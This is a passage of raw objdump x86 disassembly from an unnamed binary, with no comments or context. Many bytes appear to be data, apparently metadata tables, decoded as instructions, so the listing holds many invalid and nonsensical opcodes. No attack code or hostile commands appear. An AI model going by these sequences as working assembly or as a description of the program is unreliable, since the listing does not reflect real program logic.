  4069ba:	7a 1c                	jp     0x4069d8
  4069bc:	5a                   	pop    %edx
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	fa                   	cli
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	ca 14 64             	lret   $0x6414
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	01 15 0e 00 5c 00    	add    %edx,0x5c000e
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 40 0c b1    	add    %dl,-0x4ef3c000(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 40 0c             	add    %al,0xc(%eax)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 40 0c             	add    %al,0xc(%eax)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 01 15 0e    	add    %al,0xe150118(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 41 0f             	add    %al,0xf(%ecx)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 5a 0c             	add    %bl,0xc(%edx)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 36                	add    %dh,(%esi)
  406a47:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 d7                	add    %dl,%bh
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 25 06 e1 02 68    	add    %ah,0x6802e106
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 64 10 e8          	add    %ah,-0x18(%eax,%edx,1)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 a4 13 f6 02 6e 00 	add    %ah,0x6e02f6(%ebx,%edx,1)
  406a92:	78 20                	js     0x406ab4
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	01 15 0e 00 70 00    	add    %edx,0x70000e
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 67 18             	add    %ah,0x18(%edi)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 5e 18             	add    %bl,0x18(%esi)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	c7                   	(bad)
  406ac1:	0a 00                	or     (%eax),%al
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 c7                	add    %al,%bh
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 c7                	add    %al,%bh
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 c7                	add    %al,%bh
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 c7                	add    %al,%bh
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 c7                	add    %al,%bh
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 c7                	add    %al,%bh
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 c7                	add    %al,%bh
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 c7                	add    %al,%bh
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 c7                	add    %al,%bh
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 a8 07 00 00 01    	add    %ch,0x1000007(%eax)
  406b01:	00 4e 13             	add    %cl,0x13(%esi)
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	ad                   	lods   %ds:(%esi),%eax
  406b09:	08 00                	or     %al,(%eax)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 ac 10 00 00 04 00 	add    %ch,0x40000(%eax,%edx,1)
  406b14:	1e                   	push   %ds
  406b15:	18 00                	sbb    %al,(%eax)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 ce                	add    %cl,%dh
  406b1b:	12 00                	adc    (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 15 0d 00 00 01    	add    %dl,0x100000d
  406b25:	00 bb 0d 00 00 01    	add    %bh,0x100000d(%ebx)
  406b2b:	00 bb 0d 00 00 01    	add    %bh,0x100000d(%ebx)
  406b31:	00 25 0d 00 00 01    	add    %ah,0x100000d
  406b37:	00 d0                	add    %dl,%al
  406b39:	18 00                	sbb    %al,(%eax)
  406b3b:	00 01                	add    %al,(%ecx)
  406b3d:	00 bf 04 00 00 02    	add    %bh,0x2000004(%edi)
  406b43:	00 f9                	add    %bh,%cl
  406b45:	1b 00                	sbb    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 5e 1b             	add    %bl,0x1b(%esi)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	30 07                	xor    %al,(%edi)
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	39 18                	cmp    %ebx,(%eax)
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	02 00                	add    (%eax),%al
  406b5c:	1c 1b                	sbb    $0x1b,%al
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	f7 16                	notl   (%esi)
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 4e 13             	add    %cl,0x13(%esi)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	67 0b 00             	or     (%bx,%si),%eax
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 a8 07 00 00 02    	add    %ch,0x2000007(%eax)
  406b8b:	00 c7                	add    %al,%bh
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 c7                	add    %al,%bh
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 a8 07 00 00 01    	add    %ch,0x1000007(%eax)
  406b9d:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406ba3:	00 22                	add    %ah,(%edx)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	41                   	inc    %ecx
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 dd                	add    %bl,%ch
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406bbb:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406bc1:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406bc7:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406bdf:	00 b1 1b 00 00 01    	add    %dh,0x100001b(%ecx)
  406be5:	00 bb 18 00 00 01    	add    %bh,0x1000018(%ebx)
  406beb:	00 4b 16             	add    %cl,0x16(%ebx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	c7                   	(bad)
  406bf3:	16                   	push   %ss
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	c7                   	(bad)
  406bf9:	16                   	push   %ss
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	fe                   	(bad)
  406bff:	1b 00                	sbb    (%eax),%eax
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 fe                	add    %bh,%dh
  406c05:	1b 00                	sbb    (%eax),%eax
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 fe                	add    %bh,%dh
  406c0b:	1b 00                	sbb    (%eax),%eax
  406c0d:	00 01                	add    %al,(%ecx)
  406c0f:	00 fe                	add    %bh,%dh
  406c11:	1b 00                	sbb    (%eax),%eax
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 fe                	add    %bh,%dh
  406c17:	1b 00                	sbb    (%eax),%eax
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 bb 0d 00 00 01    	add    %bh,0x100000d(%ebx)
  406c21:	00 a8 0d 00 00 02    	add    %ch,0x200000d(%eax)
  406c27:	00 b3 0d 00 00 01    	add    %dh,0x100000d(%ebx)
  406c2d:	00 c7                	add    %al,%bh
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c7                	add    %al,%bh
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 c7                	add    %al,%bh
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 27                	add    %ah,(%edi)
  406c41:	1c 00                	sbb    $0x0,%al
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 c7                	add    %al,%bh
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 a8 07 00 00 01    	add    %ch,0x1000007(%eax)
  406c51:	00 a8 07 00 00 01    	add    %ch,0x1000007(%eax)
  406c57:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406c5d:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406c63:	00 c7                	add    %al,%bh
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 c7                	add    %al,%bh
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 c7                	add    %al,%bh
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 f4                	add    %dh,%ah
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 c7                	add    %al,%bh
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 f4                	add    %dh,%ah
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 c7                	add    %al,%bh
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 27                	add    %ah,(%edi)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	27                   	daa
  406c95:	07                   	pop    %es
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	67 0d 00 00 01 00    	addr16 or $0x10000,%eax
  406ca0:	c7                   	(bad)
  406ca1:	0a 00                	or     (%eax),%al
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 68 0e             	add    %ch,0xe(%eax)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	6d                   	insl   (%dx),%es:(%edi)
  406cad:	0e                   	push   %cs
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	6d                   	insl   (%dx),%es:(%edi)
  406cb3:	0e                   	push   %cs
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	c7                   	(bad)
  406cb9:	16                   	push   %ss
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	27                   	daa
  406cbf:	07                   	pop    %es
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	b8 17 00 00 01       	mov    $0x1000017,%eax
  406cc9:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406ccf:	00 c7                	add    %al,%bh
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c7                	add    %al,%bh
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 c7                	add    %al,%bh
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 b8 17 00 00 02    	add    %bh,0x2000017(%eax)
  406ce7:	00 90 10 00 00 01    	add    %dl,0x1000010(%eax)
  406ced:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406cf3:	00 71 0b             	add    %dh,0xb(%ecx)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	b8 17 00 00 01       	mov    $0x1000017,%eax
  406cff:	00 b8 17 00 00 01    	add    %bh,0x1000017(%eax)
  406d05:	00 b8 17 00 00 02    	add    %bh,0x2000017(%eax)
  406d0b:	00 77 0e             	add    %dh,0xe(%edi)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d17:	00 be 16 00 00 01    	add    %bh,0x1000016(%esi)
  406d1d:	00 b8 17 00 00 02    	add    %bh,0x2000017(%eax)
  406d23:	00 6d 0e             	add    %ch,0xe(%ebp)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d2f:	00 6d 0e             	add    %ch,0xe(%ebp)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d3b:	00 68 0e             	add    %ch,0xe(%eax)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d47:	00 72 0e             	add    %dh,0xe(%edx)
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	b8 17 00 00 02       	mov    $0x2000017,%eax
  406d53:	00 72 0e             	add    %dh,0xe(%edx)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	b1 1b                	mov    $0x1b,%cl
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	b1 1b                	mov    $0x1b,%cl
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 ea 1a bb    	add    %dh,-0x44e51600(%ecx)
  406d6f:	01 b1 00 d6 1b bf    	add    %esi,-0x40e42a00(%ecx)
  406d75:	01 b1 00 c5 19 0e    	add    %esi,0xe19c500(%ecx)
  406d7b:	00 b9 00 e9 14 64    	add    %bh,0x6414e900(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 01                	add    %al,(%ecx)
  406d85:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d8a:	01 15 0e 00 d9 00    	add    %edx,0xd9000e
  406d90:	01 15 2e 03 e9 00    	add    %edx,0xe9032e
  406d96:	01 15 6b 01 f1 00    	add    %edx,0xf1016b
  406d9c:	01 15 6b 01 f9 00    	add    %edx,0xf9016b
  406da2:	01 15 6b 01 01 01    	add    %edx,0x101016b
  406da8:	01 15 6b 01 09 01    	add    %edx,0x109016b
  406dae:	01 15 6b 01 11 01    	add    %edx,0x111016b
  406db4:	01 15 6b 01 19 01    	add    %edx,0x119016b
  406dba:	01 15 6b 01 21 01    	add    %edx,0x121016b
  406dc0:	01 15 6b 01 29 01    	add    %edx,0x129016b
  406dc6:	01 15 6b 01 31 01    	add    %edx,0x131016b
  406dcc:	01 15 4b 02 39 01    	add    %edx,0x139024b
  406dd2:	01 15 0e 00 41 01    	add    %edx,0x141000e
  406dd8:	01 15 6b 01 49 01    	add    %edx,0x149016b
  406dde:	80 12 7f             	adcb   $0x7f,(%edx)
  406de1:	00 51 01             	add    %dl,0x1(%ecx)
  406de4:	6e                   	outsb  %ds:(%esi),(%dx)
  406de5:	00 c4                	add    %al,%ah
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	ef                   	out    %eax,(%dx)
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 71 10             	add    %esi,0x10(%ecx)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	01 15 0e 00 61 01    	add    %edx,0x161000e
  406dfc:	37                   	aaa
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	20 0c 2a             	and    %cl,(%edx,%ebp,1)
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	af                   	scas   %es:(%edi),%eax
  406e09:	0c d3                	or     $0xd3,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 01                	add    %al,(%ecx)
  406e0f:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e14:	c6                   	(bad)
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	91                   	xchg   %eax,%ecx
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	b5 16                	mov    $0x16,%ch
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 e2 01 c7 00    	addl   $0xc701e2,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	37                   	aaa
  406e2d:	0d eb 03 19 00       	or     $0x1903eb,%eax
  406e32:	01 15 09 04 19 00    	add    %edx,0x190409
  406e38:	47                   	inc    %edi
  406e39:	0b 01                	or     (%ecx),%eax
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 6b             	roll   $0x6b,(%ecx)
  406e45:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e4a:	e1 19                	loope  0x406e65
  406e4c:	1c 04                	sbb    $0x4,%al
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	01 15 0e 00 d1 01    	add    %edx,0x1d1000e
  406e56:	da 1b                	ficompl (%ebx)
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 f2                	add    %esi,%edx
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	48                   	dec    %eax
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 34 03             	add    %dh,(%ebx,%eax,1)
  406e6a:	bf 01 19 00 48       	mov    $0x48001901,%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 01                	add    %eax,(%ecx)
  406e75:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e7a:	01 15 36 02 99 01    	add    %edx,0x1990236
  406e80:	62 17                	bound  %edx,(%edi)
  406e82:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e85:	01 4b 0c             	add    %ecx,0xc(%ebx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 e1             	roll   $0xe1,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 da                	add    %ebx,%edx
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 6a 08             	add    %ebp,0x8(%edx)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 01                	add    %eax,(%ecx)
  406e9f:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406ea4:	01 15 56 04 21 00    	add    %edx,0x210456
  406eaa:	01 15 5c 04 19 00    	add    %edx,0x19045c
  406eb0:	2e 1b 66 04          	sbb    %cs:0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	66 0c 47             	data16 or $0x47,%al
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 6a 1a             	add    %ch,0x1a(%edx)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 01                	add    (%ecx),%al
  406ec3:	15 56 04 29 00       	adc    $0x290456,%eax
  406ec8:	01 15 78 04 31 02    	add    %edx,0x2310478
  406ece:	01 15 56 04 c1 00    	add    %edx,0xc10456
  406ed4:	07                   	pop    %es
  406ed5:	03 82 04 39 02 9a    	add    -0x65fdc6fc(%edx),%eax
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 72 17             	add    %dh,0x17(%edx)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 6a 08             	add    %ch,0x8(%edx)
  406ee8:	0e                   	push   %cs
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 6a 08             	add    %ch,0x8(%edx)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 6a 08             	add    %ch,0x8(%edx)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 ff                	add    %bh,%bh
  406ef9:	02 a1 04 49 02 6e    	add    0x6e024904(%ecx),%ah
  406eff:	00 a7 04 c1 00 0c    	add    %ah,0xc00c104(%edi)
  406f05:	03 ae 04 51 02 01    	add    0x1025104(%esi),%ebp
  406f0b:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f10:	01 15 b6 04 49 01    	add    %edx,0x14904b6
  406f16:	93                   	xchg   %eax,%ebx
  406f17:	1b bd 04 61 02 82    	sbb    -0x7dfd9efc(%ebp),%edi
  406f1d:	14 cf                	adc    $0xcf,%al
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 b5 16 9f 01 19    	add    0x19019f16(%ebp),%dh
  406f27:	00 3c 0f             	add    %bh,(%edi,%ecx,1)
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 e8                	add    %ch,%al
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 01                	add    (%ecx),%al
  406f35:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f3a:	a8 11                	test   $0x11,%al
  406f3c:	15 02 c1 00 42       	adc    $0x4200c102,%eax
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	ef                   	out    %eax,(%dx)
  406f47:	19 9a 00 71 02 40    	sbb    %ebx,0x40027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	ca 15 c7             	lret   $0xc715
  406f55:	00 a1 02 e2 07 01    	add    %ah,0x107e202(%ecx)
  406f5b:	05 79 02 01 15       	add    $0x15010279,%eax
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 42 18             	add    0x18(%edx),%al
  406f66:	07                   	pop    %es
  406f67:	05 81 02 a8 06       	add    $0x6a80281,%eax
  406f6c:	0d 05 a9 02 f1       	or     $0xf102a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 5c 07 47    	add    0x47075c02(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 77 1d             	add    %esi,0x1d(%edi)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 e5                	add    %ch,%ah
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	37                   	aaa
  406f89:	0f 0e                	femms
  406f8b:	00 89 02 01 15 0e    	add    %cl,0xe150102(%ecx)
  406f91:	00 89 02 fe 06 6b    	add    %cl,0x6b06fe02(%ecx)
  406f97:	01 b1 02 e8 06 47    	add    %esi,0x4706e802(%ecx)
  406f9d:	02 a1 02 e4 10 c7    	add    -0x38ef1bfe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 bd 18 1a 05 89    	add    %edi,-0x76fae5e8(%ebp)
  406fab:	02 85 18 6b 01 89    	add    -0x76fe94e8(%ebp),%al
  406fb1:	02 c5                	add    %ch,%al
  406fb3:	06                   	push   %es
  406fb4:	20 05 89 02 14 1c    	and    %al,0x1c140289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 93 1b 27    	add    0x271b9302(%ecx),%al
  406fc1:	05 c1 02 5e 14       	add    $0x145e02c1,%eax
  406fc6:	30 05 c9 02 78 08    	xor    %al,0x87802c9
  406fcc:	c7 00 91 02 bb 1c    	movl   $0x1cbb0291,(%eax)
  406fd2:	35 05 c1 01 bd       	xor    $0xbd01c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 be 0a       	add    $0xabe0291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 a6 18       	add    $0x18a602d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	d8 08                	fmuls  (%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 01                	add    (%ecx),%al
  406fef:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ff4:	68 16 2a 01 a1       	push   $0xa1012a16
  406ff9:	02 0b                	add    (%ebx),%cl
  406ffb:	07                   	pop    %es
  406ffc:	c3                   	ret
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 bd 18 01 05 99    	add    %edi,-0x66fafee8(%ebp)
  407005:	02 01                	add    (%ecx),%al
  407007:	15 6b 01 f1 02       	adc    $0x2f1016b,%eax
  40700c:	d8 07                	fadds  (%edi)
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 5b 0d             	add    0xd(%ebx),%bl
  407014:	c3                   	ret
